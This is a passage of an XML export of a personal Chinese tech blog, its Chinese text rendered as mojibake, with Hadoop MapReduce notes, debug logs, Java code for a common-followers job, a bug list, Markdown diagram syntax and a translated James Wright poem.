write------==================ç¬¬22æ¬¡è¿›å…¥reduceenglish liujialing 62.142857142857146---------in for write------==================ç¬¬23æ¬¡è¿›å…¥reducecomputer liuyifei 62.142857142857146---------in for write------==================ç¬¬24æ¬¡è¿›å…¥reduceenglish liuyifei 59.57142857142857---------in for write------english huangdatou 56.0---------in for write------==================ç¬¬25æ¬¡è¿›å…¥reducemath liutao 56.0---------in for write------==================ç¬¬26æ¬¡è¿›å…¥reducealgorithm huangdatou 56.0---------in for write------==================ç¬¬27æ¬¡è¿›å…¥reducecomputer huangdatou 56.0---------in for write------==================ç¬¬28æ¬¡è¿›å…¥reduceenglish huangbo 55.0---------in for write------ CustomBeanä¸­åšäº†åˆ†ç»„&amp;ç»„å†…æ’åº çš„123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120// **Beanä¸­ç›¸åŒçš„ç»„è¿›è¡Œåˆ†æ•°é™åºï¼Œ ç»„è¿›è¡Œå­—å…¸æ’åºï¼Œæ­¤æ—¶MyGroupä¸­æ‰§è¡Œçš„**algorithm---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---math// ======================reduceä¸­æ‰§è¡Œ============================================ç¬¬1æ¬¡è¿›å…¥reducealgorithm huangjiaju 82.28571428571429---------in for write------algorithm liutao 82.0---------in for write------algorithm huanglei 74.42857142857143---------in for write------algorithm huangzitao 72.75---------in for write------algorithm liuyifei 62.142857142857146---------in for write------algorithm huangdatou 56.0---------in for write------===================ç¦»å¼€reduce==================ç¬¬2æ¬¡è¿›å…¥reducecomputer huangjiaju 83.2---------in for write------computer liutao 83.0---------in for write------computer huanglei 74.42857142857143---------in for write------computer huangzitao 72.42857142857143---------in for write------computer huangxiaoming 72.42857142857143---------in for write------computer huangbo 65.25---------in for write------computer xuzheng 65.0---------in for write------computer liujialing 64.11111111111111---------in for write------computer liuyifei 62.142857142857146---------in for write------computer huangdatou 56.0---------in for write------===================ç¦»å¼€reduce==================ç¬¬3æ¬¡è¿›å…¥reduceenglish huanglei 83.0---------in for write------english liuyifei 74.42857142857143---------in for write------english huangxiaoming 72.42857142857143---------in for write------english zhaobenshan 69.28571428571429---------in for write------english zhouqi 64.18181818181819---------in for write------english liujialing 62.142857142857146---------in for write------english liuyifei 59.57142857142857---------in for write------english huangdatou 56.0---------in for write------english huangbo 55.0---------in for write------===================ç¦»å¼€reduce==================ç¬¬4æ¬¡è¿›å…¥reducemath huangxiaoming 83.0---------in for write------math huangjiaju 82.28571428571429---------in for write------math huanglei 74.42857142857143---------in for write------math liujialing 72.75---------in for write------math wangbaoqiang 72.42857142857143---------in for write------math xuzheng 69.28571428571429---------in for write------math liutao 56.0---------in for write------===================ç¦»å¼€reduce// ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ å¦‚æœåªå–ä¸€ä¸ªæ¯æ¬¡valuesçš„ç¬¬ä¸€ä¸ªçš„è¯ ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿algorithm huangjiaju 82.28571428571429==================ç¬¬1æ¬¡è¿›å…¥reducecomputer huangjiaju 83.2==================ç¬¬2æ¬¡è¿›å…¥reduceenglish huanglei 83.0==================ç¬¬3æ¬¡è¿›å…¥reducemath huangxiaoming 83.0==================ç¬¬4æ¬¡è¿›å…¥reduce å…¶å®ƒç–‘ç‚¹ é€šè¿‡logå¯ä»¥çœ‹å‡ºæ¥ï¼Œ MyGroupæ˜¯åœ¨è¯»åˆ°äº†ä¸åŒçš„æ•°æ®ï¼Œæ‰ä¼šè¿›å…¥åˆ° reduce ç±»ä¸­å†™å‡ºï¼› ä½†æ˜¯ é€šè¿‡ æ–­ç‚¹è°ƒè¯•æ—¶ï¼Œ ç°è±¡æ˜¯ï¼Œç¬¬ä¸€æ¬¡è¯»åˆ°äº†2ä¸ªç›¸åŒçš„ï¼Œå°±å»reduceå»å†™å‡ºäº†ï¼› åé¢å†è¯»çš„å°±ä¸åšå†™å‡ºæ“ä½œï¼Œç›´åˆ°ä¸‹ä¸€æ¬¡è¯»åˆ°2ä¸ªç›¸åŒçš„ï¼Œå†åœ¨reduceä¸­å†™å‡ºã€‚ title:ï£¿ï£¿ï£¿ï£¿ï£¿ æ‰§è¡Œæµç¨‹æ—¶åºå›¾ ï£¿ï£¿ï£¿ï£¿ï£¿ Mapper(map)->ScoreBean: k:ScoreBean(courseName,avgScore) Mapper(map)->ScoreBean: v:Text(stuName) Mapper(ScoreBean)->Reducer(MyGroup): courseæŒ‰å­—å…¸å‡åº Mapper(ScoreBean)->Reducer(MyGroup): courseå†…æˆç»©é™åº Reducer(MyGroup)->Reducer(reduce): æ ¹æ®è‡ªå®šä¹‰çš„åˆ†ç»„è§„åˆ™æŒ‰ç»„è¾“å‡º Reducer(MyGroup)->Reducer(reduce): ä¸€ç»„åªè°ƒç”¨reduceä¸€æ¬¡ Reducer(reduce)-->Reducer(reduce):{"theme":"simple"} var code = document.getElementById("sequence-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-0-options").value)); var diagram = Diagram.parse(code); diagram.drawSVG("sequence-0", options);]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[â–å¼€å§‹]]></title>
    <url>%2F2018%2F06%2F10%2FPoetry%2F%E5%BC%80%E5%A7%8B%2F</url>
    <content type="text"><![CDATA[æœˆäº®è½ä¸‹ä¸€ä¸¤ç‰‡ç¾½æ¯›åœ¨ç”°é‡ä¸Šã€‚ é»‘æš—ä¸­çš„éº¦å­è†å¬ç€ã€‚ å¿«é™ä¸‹æ¥ã€‚ å¿«ã€‚ å°±åœ¨é‚£å„¿ï¼Œæœˆäº®çš„å­©å­ä»¬æ­£è¯•ç€ æŒ¥åŠ¨ç¿…è†€ã€‚ åœ¨ä¸¤æ£µæ ‘ä¹‹é—´ï¼Œèº«æä¿®é•¿çš„å¥³å­æŠ¬èµ·é¢åºï¼Œ ç¾ä¸½çš„å‰ªå½±ã€‚æ¥ç€ï¼Œå¥¹æ­¥å…¥ç©ºä¸­ï¼Œæ¥ç€ï¼Œ å¥¹å®Œå…¨æ¶ˆå¤±åœ¨ç©ºä¸­ã€‚ æˆ‘ç‹¬è‡ªç«™åœ¨ä¸€æ£µæ¥éª¨æœ¨æ—ï¼Œä¸æ•¢å‘¼å¸ï¼Œ ä¹Ÿä¸æ•¢åŠ¨ã€‚ æˆ‘è†å¬ç€ã€‚ éº¦å­å‘åé ç€è‡ªå·±çš„é»‘æš—ï¼Œ è€Œæˆ‘é ç€æˆ‘çš„ã€‚ ä½œè€… / [ç¾å›½] è©¹å§†æ–¯Â·èµ–ç‰¹ ç¿»è¯‘ / å¼ æ–‡æ­¦ â–Beginning The moon drops one or two feathers into the fields. The dark wheat listens. Be still. Now. There they are, the moonâ€™s young, trying Their wings. Between trees, a slender woman lifts up the lovely shadow Of her face, and now she steps into the air, now she is gone Wholly, into the air. I stand alone by an elder tree, I do not dare breathe Or move. I listen. The wheat leans back toward its own darkness, And I lean toward mine. Author / James Wright]]></content>
      <categories>
        <category>æ–‡è‰º</category>
        <category>è¯—æ­Œ</category>
      </categories>
      <tags>
        <tag>è¯—æ­Œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdowné«˜é˜¶è¯­æ³•]]></title>
    <url>%2F2018%2F06%2F10%2FTools%2FMarkdown%2FMarkdown%E9%AB%98%E9%98%B6%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[æ—¶åºå›¾çš„å†™æ³• æµç¨‹å›¾çš„å†™æ³• ç±»å›¾çš„å†™æ³• st=>start: Start|past:>http://www.google.com[blank] e=>end: End:>http://www.google.com op1=>operation: My Operation|past op2=>operation: Stuff|current sub1=>subroutine: My Subroutine|invalid cond=>condition: Yes or No?|approved:>http://www.google.com c2=>condition: Good idea|rejected io=>inputoutput: catch something...|request st->op1(right)->cond cond(yes, right)->c2 cond(no)->sub1(left)->op1 c2(yes)->io->e c2(no)->op2->e{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12} var code = document.getElementById("flowchart-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value)); var diagram = flowchart.parse(code); diagram.drawSVG("flowchart-0", options);mapper->Bob: Hello Bob, how are you? Note right of Bob: Bob thinks Bob-->reducer: I am good thanks!ad u? reducer->out: I'm fine too out->me: ok, you win me-->Bob: nono, not{"theme":"simple"} var code = document.getElementById("sequence-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-0-options").value)); var diagram = Diagram.parse(code); diagram.drawSVG("sequence-0", options);]]></content>
      <categories>
        <category>å·¥å…·</category>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>å·¥å…·</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[About Sublime Text3]]></title>
    <url>%2F2018%2F06%2F09%2FTools%2FSublime%2F%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98%2F</url>
    <content type="text"><![CDATA[ä¸»é¢˜è¯¦æƒ…å‚è§è¿™ä¸ªç½‘ç«™ è¯¦ç»†æ“ä½œè§æ­¤ç«™]]></content>
      <categories>
        <category>å·¥å…·</category>
        <category>Sublime</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>å·¥å…·</tag>
        <tag>Sublime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduceç¬”è®°-Bugæ±‡æ€»]]></title>
    <url>%2F2018%2F06%2F09%2FHadoop%2F2-MapReduce%2FMapReduce-Bug%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[1ã€reduce è¾“å‡ºè·¯å¾„å¿…é¡»æ˜¯æ–°åˆ›å»ºçš„ã€‚ä¸èƒ½å·²ç»å­˜åœ¨1Exception in thread "main" org.apache.hadoop.mapred.FileAlreadyExistsException: Output directory hdfs://cs1:9000/flowout01 already exists 2ã€åœ¨åˆå§‹åŒ– job çš„æ—¶å€™ï¼Œ æ²¡æœ‰ä¼  conf ï¼Œ å¯¼è‡´åé¢ä¸€ç›´æ‰¾ä¸åˆ°æ–‡ä»¶ï¼Œ å› ä¸ºä¸çŸ¥é“åˆ°å“ªé‡Œå»æ‰¾3ã€Textå¯¼åŒ…å€’é”™, å¯¼çš„æ—¶å€™è¦æ³¨æ„åº”è¯¥æ˜¯è¿™ä¸ª import org.apache.hadoop.io.Text; 4ã€è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥çš„æ—¶å€™ï¼ŒæŠŠ StringBuilder å†™åˆ°äº† reduce æ–¹æ³•å¤–ï¼Œ è¿™æ ·å¯¼è‡´ sb ä¼šè¶Šæ¥è¶Šå¤šï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥æ¯æ¬¡æ‹¼æ¥å®Œäº†æ¸…ç©ºç±»ä¼¼äºè¿™æ · 1234567891011121314A F,I,O,K,G,D,C,H,BB F,I,O,K,G,D,C,H,B,E,J,F,AC F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,FD F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,LE F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,HF F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,GG F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,MH F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,OI F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,CJ F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,C,OK F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,C,O,O,BL F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,C,O,O,B,D,EM F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,C,O,O,B,D,E,E,FO F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,C,O,O,B,D,E,E,F,A,H,I,J,F 4ã€mapreduceæ‰§è¡Œé”™è¯¯Mapper.\é”™è¯¯ Mapper &amp; Reducer å†™æˆå†…éƒ¨ç±»çš„æ—¶å€™ï¼Œæœ‰æ²¡æœ‰åŠ ä¸Š static Beanç±»æœ‰æ²¡æœ‰æ— å‚æ„é€  5ã€æ’åºè¿‡ç¨‹ä¸­ï¼Œè‡ªå®šä¹‰äº†æ’åºç±»ï¼Œbeanç±»çš„ compareTo()æ–¹æ³•ï¼Œåªå†™äº†æŒ‰ç…§åˆ†æ•°å¤§å°æ’åºã€‚ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼š è¯¾ç¨‹å¹¶æ²¡æœ‰åˆ†ç»„ æ²¡æœ‰åœ¨ç›¸åŒçš„ä¸€ç»„è¯¾ç¨‹ä¸­æ¯”è¾ƒåˆ†æ•°ï¼Œ è€Œæ˜¯æ¯”è¾ƒçš„æ‰€æœ‰çš„åˆ†æ•° 12345678computer huangjiaju 83.2math huangxiaoming 83.0english huanglei 83.0math huangjiaju 82.28571428571429algorithm huangjiaju 82.28571428571429computer huanglei 74.42857142857143english liuyifei 74.42857142857143... æ­¤æ—¶åº”è¯¥åœ¨Beanå¯¹è±¡ä¸­åšå¦‚ä¸‹äº‹æƒ… ç›¸åŒè¯¾ç¨‹çš„æŒ‰ç…§åˆ†æ•°é™åºæ’åº è¯¾ç¨‹åæŒ‰ç…§è‡ªç„¶ï¼ˆå‡åºï¼‰æ’åº æ¢è¨€ä¹‹ï¼Œå°±æ˜¯CustomBean å¯¹è±¡è¦è¾“å‡ºçš„æ•°æ®æ˜¯ ç»„åå‡åºæ’åºï¼Œç»„å†…æŒ‰æˆç»©é™åºæ’åº å…·ä½“åˆ†æå‚é˜…]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduceç¬”è®°-ç»ƒä¹ ]]></title>
    <url>%2F2018%2F06%2F09%2FHadoop%2F2-MapReduce%2FMapReduce-%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[æ±‚å¾®åšå…±åŒç²‰ä¸é¢˜ç›®æ¶‰åŠçŸ¥è¯†ç‚¹ï¼š å¤š Job ä¸²è” 1234567891011121314A:B,C,D,F,E,OB:A,C,E,KC:F,A,D,ID:A,E,F,LE:B,C,D,M,LF:A,B,C,D,E,O,MG:A,C,D,E,FH:A,C,D,E,OI:A,OJ:B,OK:A,C,DL:D,E,FM:E,F,GO:A,H,I,J,K ä»¥ä¸Šæ˜¯æ•°æ®ï¼šA:B,C,D,F,E,Oè¡¨ç¤ºï¼šAç”¨æˆ· å…³æ³¨B,C,D,E,F,O æ±‚æ‰€æœ‰ä¸¤ä¸¤ç”¨æˆ·ä¹‹é—´çš„å…±åŒå…³æ³¨å¯¹è±¡ ç­”æ¡ˆï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299package com.rox.mapreduce.mr3._01_å¤šJobä¸²è”;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.jobcontrol.ControlledJob;import org.apache.hadoop.mapreduce.lib.jobcontrol.JobControl;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class CommonFansDemo &#123; @SuppressWarnings("deprecation") public static void main(String[] args) throws Exception &#123; // Job é€»è¾‘ // æŒ‡å®š HDFS ç›¸å…³çš„å‚æ•° Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); //ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ // æ–°å»ºä¸€ä¸ª job1 Job job1 = Job.getInstance(conf); // è®¾ç½® Jar åŒ…æ‰€åœ¨è·¯å¾„ job1.setJarByClass(CommonFansDemo.class); // æŒ‡å®š mapper ç±»å’Œ reducer ç±» job1.setMapperClass(MyMapper_Step1.class); job1.setReducerClass(MyReducer_Step1.class); // æŒ‡å®š maptask çš„è¾“å‡ºç±»å‹ job1.setMapOutputKeyClass(Text.class); job1.setMapOutputValueClass(Text.class); // æŒ‡å®šæœ€ç»ˆçš„è¾“å‡ºç±»å‹(reduceå­˜åœ¨æ—¶,å°±æ˜¯æŒ‡ ReduceTask çš„è¾“å‡ºç±»å‹) job1.setOutputKeyClass(Text.class); job1.setOutputValueClass(Text.class); // æŒ‡å®šè¯¥ MapReduce ç¨‹åºæ•°æ®çš„è¾“å…¥è¾“å‡ºè·¯å¾„ FileInputFormat.setInputPaths(job1, new Path("/in/commonfriend")); FileOutputFormat.setOutputPath(job1, new Path("/out/job1")); //ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ // æ–°å»ºä¸€ä¸ª job2 Job job2 = Job.getInstance(conf); // è®¾ç½® Jar åŒ…æ‰€åœ¨è·¯å¾„ job2.setJarByClass(CommonFansDemo.class); // æŒ‡å®š mapper ç±»å’Œ reducer ç±» job2.setMapperClass(MyMapper_Step2.class); job2.setReducerClass(MyReducer_Step2.class); // æŒ‡å®š maptask çš„è¾“å‡ºç±»å‹ job2.setMapOutputKeyClass(Text.class); job2.setMapOutputValueClass(Text.class); // æŒ‡å®šæœ€ç»ˆçš„è¾“å‡ºç±»å‹(reduceå­˜åœ¨æ—¶,å°±æ˜¯æŒ‡ ReduceTask çš„è¾“å‡ºç±»å‹) job2.setOutputKeyClass(Text.class); job2.setOutputValueClass(Text.class); // æŒ‡å®šè¯¥ MapReduce ç¨‹åºæ•°æ®çš„è¾“å…¥è¾“å‡ºè·¯å¾„ FileInputFormat.setInputPaths(job2, new Path("/out/job1")); FileOutputFormat.setOutputPath(job2, new Path("/out/job2")); //ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ /** * å°†å¤šä¸ª job å½“åšä¸€ä¸ªç»„ä¸­çš„ job æäº¤, å‚æ•°åæ˜¯ç»„å * æ³¨æ„: JobControl æ˜¯å®ç°äº† Runnable æ¥å£çš„ */ JobControl jControl = new JobControl("common_friend"); // å°†åŸç”Ÿçš„ jobæºå¸¦é…ç½® è½¬æ¢ä¸ºå¯æ§çš„ job ControlledJob aJob = new ControlledJob(job1.getConfiguration()); ControlledJob bJob = new ControlledJob(job2.getConfiguration()); // æ·»åŠ ä¾èµ–å…³ç³» bJob.addDependingJob(aJob); // æ·»åŠ  job åˆ°ç»„ä¸­ jControl.addJob(aJob); jControl.addJob(bJob); // å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ Thread jobThread = new Thread(jControl); jobThread.start(); while (!jControl.allFinished()) &#123; Thread.sleep(500); &#125; jobThread.stop(); &#125; static class MyMapper_Step1 extends Mapper&lt;LongWritable, Text, Text, Text&gt; &#123; String[] user_attentions; String[] attentions; Text k = new Text(); Text v = new Text(); @Override protected void map(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; user_attentions = value.toString().split(":"); attentions = user_attentions[1].trim().split(","); for (String att : attentions) &#123; k.set(att); v.set(user_attentions[0].trim()); context.write(k, v); &#125; &#125; &#125; /** * @author shixuanji * å°†ä¸¤ä¸¤ç²‰ä¸(æ™®é€šç”¨æˆ·)æ‹¼æ¥èµ·æ¥, æ ¼å¼a-f:c =&gt; a,b éƒ½å…±åŒå…³æ³¨äº† c * * A F,I,O,K,G,D,C,H,B B E,J,F,A C B,E,K,A,H,G,F D H,C,G,F,E,A,K,L E A,B,L,G,M,F,D,H F C,M,L,A,D,G */ static class MyMapper_Step2 extends Mapper&lt;LongWritable, Text, Text, Text&gt; &#123; String[] attenion_users; String[] users; Text k = new Text(); Text v = new Text(); @Override protected void map(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; attenion_users = value.toString().split("\t"); users = attenion_users[1].trim().split(","); for (String u1 : users) &#123; for (String u2 : users) &#123; if (u1.compareTo(u2) &lt; 0) &#123; String users = u1 + "-" + u2; k.set(users); v.set(attenion_users[0].trim()); context.write(k, v); &#125; &#125; &#125; &#125; &#125; /** * @author shixuanji * éœ€è¦ç»Ÿè®¡çš„æ˜¯, æŸäººæ‹¥æœ‰çš„å…¨éƒ¨ç²‰ä¸ * key: ä¼ è¿‡æ¥çš„ key * value: ç”¨,åˆ†å‰² */ static class MyReducer_Step1 extends Reducer&lt;Text, Text, Text, Text&gt; &#123; Text k = new Text(); Text v = new Text(); @Override protected void reduce(Text key, Iterable&lt;Text&gt; values, Reducer&lt;Text, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; // æ³¨æ„: è¿™é‡Œ sb ä¸èƒ½å†™åœ¨å¤–é¢,ä¼šä¸æ–­çš„æ‹¼æ¥ StringBuilder sb = new StringBuilder(); for (Text v : values) &#123; sb.append(v.toString()).append(","); &#125; k.set(key); v.set(sb.substring(0, sb.length() - 1)); context.write(k, v); &#125; &#125; /** * @author shixuanji * æ‹¿åˆ°çš„æ•°æ®: a-b c */ static class MyReducer_Step2 extends Reducer&lt;Text, Text, Text, Text&gt; &#123; Text k = new Text(); Text v = new Text(); @Override protected void reduce(Text key, Iterable&lt;Text&gt; values, Reducer&lt;Text, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; StringBuilder sb = new StringBuilder(); for (Text attention : values) &#123; sb.append(attention.toString()).append(","); &#125; k.set(key); v.set(sb.substring(0, sb.length() - 1)); context.write(k, v); &#125; &#125;&#125;ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿// job1çš„è¾“å‡ºA F,I,O,K,G,D,C,H,BB E,J,F,AC B,E,K,A,H,G,FD H,C,G,F,E,A,K,LE A,B,L,G,M,F,D,HF C,M,L,A,D,GG MH OI O,CJ OK O,BL D,EM E,FO A,H,I,J,F// job2çš„è¾“å‡ºA-B E,CA-C D,FA-D F,EA-E C,D,BA-F O,B,E,D,CA-G E,F,D,CA-H O,E,D,CA-I OA-J B,OA-K D,CA-L D,F,EA-M E,FB-C AB-D E,AB-E CB-F A,E,CB-G C,A,EB-H A,E,CB-I AB-K C,AB-L EB-M EB-O A,KC-D A,FC-E DC-F D,AC-G F,A,DC-H D,AC-I AC-K A,DC-L F,DC-M FC-O I,AD-E LD-F E,AD-G A,F,ED-H E,AD-I AD-K AD-L F,ED-M F,ED-O AE-F C,B,M,DE-G C,DE-H C,DE-J BE-K D,CE-L DF-G A,D,C,EF-H A,E,C,D,OF-I O,AF-J O,BF-K C,A,DF-L E,DF-M EF-O AG-H A,C,D,EG-I AG-K C,A,DG-L D,E,FG-M F,EG-O AH-I O,AH-J OH-K A,D,CH-L E,DH-M EH-O AI-J OI-K AI-O AK-L DK-O AL-M F,E æ±‚å­¦ç”Ÿæˆç»©é¢˜ç›®1234567891011121314151617181920212223242526272829303132computer,huangxiaoming,85,86,41,75,93,42,85computer,xuzheng,54,52,86,91,42computer,huangbo,85,42,96,38english,zhaobenshan,54,52,86,91,42,85,75english,liuyifei,85,41,75,21,85,96,14algorithm,liuyifei,75,85,62,48,54,96,15computer,huangjiaju,85,75,86,85,85english,liuyifei,76,95,86,74,68,74,48english,huangdatou,48,58,67,86,15,33,85algorithm,huanglei,76,95,86,74,68,74,48algorithm,huangjiaju,85,75,86,85,85,74,86computer,huangdatou,48,58,67,86,15,33,85english,zhouqi,85,86,41,75,93,42,85,75,55,47,22english,huangbo,85,42,96,38,55,47,22algorithm,liutao,85,75,85,99,66computer,huangzitao,85,86,41,75,93,42,85math,wangbaoqiang,85,86,41,75,93,42,85computer,liujialing,85,41,75,21,85,96,14,74,86computer,liuyifei,75,85,62,48,54,96,15computer,liutao,85,75,85,99,66,88,75,91computer,huanglei,76,95,86,74,68,74,48english,liujialing,75,8